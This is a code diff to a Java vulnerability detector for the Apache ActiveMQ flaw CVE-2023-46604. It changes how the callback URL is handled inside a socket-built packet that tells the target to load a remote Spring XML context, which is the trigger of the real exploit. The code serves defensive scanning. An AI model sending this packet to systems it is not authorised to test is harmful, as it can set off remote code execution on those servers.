@@ -47,6 +47,8 @@ import java.time.Clock;
 import java.time.Duration;
 import java.time.Instant;
 import java.util.Map;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 import javax.inject.Inject;
 import javax.inject.Qualifier;
 import javax.net.SocketFactory;
@@ -162,6 +164,19 @@ public final class Cve202346604Detector implements VulnDetector {
   // Generate payload for Apache ActiveMQ RCE(CVE-2023-46604), and use socket to send payload
   private boolean sendPayloadToTarget(String host, int port, Payload payload) {
     try {
+      String payloadString = payload.getPayload();
+      String payloadWithoutProtocol;
+      // I noticed that there are two types of SSRF payload, one the payload exists as a
+      // subdomain and other exists as an http path
+      if (payloadString.contains("http://") || payloadString.contains("https://")) {
+        Matcher m = Pattern.compile("https?://(.*)").matcher(payloadString);
+        if (!m.find()) {
+          return false;
+        }
+        payloadWithoutProtocol = m.group(1);
+      } else {
+        payloadWithoutProtocol = payloadString;
+      }
       Socket socket = socketFactory.createSocket(host, port);
       OutputStream os = socket.getOutputStream();
       DataOutputStream dos = new DataOutputStream(os);
@@ -181,7 +196,7 @@ public final class Cve202346604Detector implements VulnDetector {
       dos.writeBoolean(true);
       dos.writeUTF("org.springframework.context.support.ClassPathXmlApplicationContext");
       dos.writeBoolean(true);
-      dos.writeUTF(String.format("http://%s", payload.getPayload()));
+      dos.writeUTF(payloadWithoutProtocol);
 
       dos.close();
       os.close();
